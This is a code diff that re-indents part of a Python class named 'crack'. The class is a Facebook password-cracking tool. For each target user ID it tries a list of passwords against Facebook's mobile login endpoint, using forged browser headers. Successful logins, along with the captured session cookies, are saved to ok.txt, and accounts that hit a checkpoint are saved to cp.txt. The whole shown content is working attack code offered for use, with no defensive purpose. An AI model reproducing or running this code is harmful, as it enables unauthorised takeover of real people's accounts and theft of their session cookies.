@@ -439,51 +439,51 @@ class crack:
 		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
 		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
 		for pw in peweh:
-            try:
-                ses=requests.Session()
-                link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
-                data = {
-                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
-                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
-                    "uid": user,
-                    "next": "https://m.facebook.com/login/save-device/",
-                    "flow": "login_no_pin",
-                    "pass": pw
-                }
-                head = {
-                    "cache-control": "max-age=0",
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "sec-ch-ua": "'Chromium';v='107', 'Not=A?Brand';v='24'",
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": '"Linux"',
-                    "sec-fetch-site": "none",
-                    "sec-fetch-mode": "navigate",
-                    "sec-fetch-user": "?1",
-                    "sec-fetch-dest": "document",
-                    "upgrade-insecure-requests": "1",
-                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "id-ID,id;q=0.9"
-                }
-                xnxx = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=head, allow_redirects=False)
-                if "c_user" in ses.cookies.get_dict():
-                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                    print(f"\r[ {H}LIVE{N} ] {user}|{pw}")
-                    kntl = (f"{user}|{pw}|{coki}")
-                    self.ok.append(kntl)
-                    with open(f"ok.txt", "a", encoding="utf-8") as r:
-                        r.write(kntl+"\n")
-                    break
-                elif "checkpoint" in ses.cookies.get_dict():
-                    print(f"\r[ {K}CHEK{N} ] {user}|{pw}")
-                    kntl = (f"{user}|{pw}")
-                    self.cp.append(kntl)
-                    with open(f"cp.txt", "a", encoding="utf-8") as r:
-                        r.write(kntl+"\n")
-                    break
-            except requests.exceptions.ConnectionError:time.sleep(10)
-            #except Exception as e:print(e)
-        self.lo+=1
+		    try:
+			ses=requests.Session()
+			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
+			data = {
+			    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+			    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+			    "uid": user,
+			    "next": "https://m.facebook.com/login/save-device/",
+			    "flow": "login_no_pin",
+			    "pass": pw
+			}
+			head = {
+			    "cache-control": "max-age=0",
+			    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+			    "sec-ch-ua": "'Chromium';v='107', 'Not=A?Brand';v='24'",
+			    "sec-ch-ua-mobile": "?0",
+			    "sec-ch-ua-platform": '"Linux"',
+			    "sec-fetch-site": "none",
+			    "sec-fetch-mode": "navigate",
+			    "sec-fetch-user": "?1",
+			    "sec-fetch-dest": "document",
+			    "upgrade-insecure-requests": "1",
+			    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
+			    "accept-encoding": "gzip, deflate, br",
+			    "accept-language": "id-ID,id;q=0.9"
+			}
+			xnxx = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=head, allow_redirects=False)
+			if "c_user" in ses.cookies.get_dict():
+			    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+			    print(f"\r[ {H}LIVE{N} ] {user}|{pw}")
+			    kntl = (f"{user}|{pw}|{coki}")
+			    self.ok.append(kntl)
+			    with open(f"ok.txt", "a", encoding="utf-8") as r:
+				r.write(kntl+"\n")
+			    break
+			elif "checkpoint" in ses.cookies.get_dict():
+			    print(f"\r[ {K}CHEK{N} ] {user}|{pw}")
+			    kntl = (f"{user}|{pw}")
+			    self.cp.append(kntl)
+			    with open(f"cp.txt", "a", encoding="utf-8") as r:
+				r.write(kntl+"\n")
+			    break
+		    except requests.exceptions.ConnectionError:time.sleep(10)
+		    #except Exception as e:print(e)
+		self.lo+=1
 		
 	#--- selesai hasil
 	def hasil(self,ok,cp):
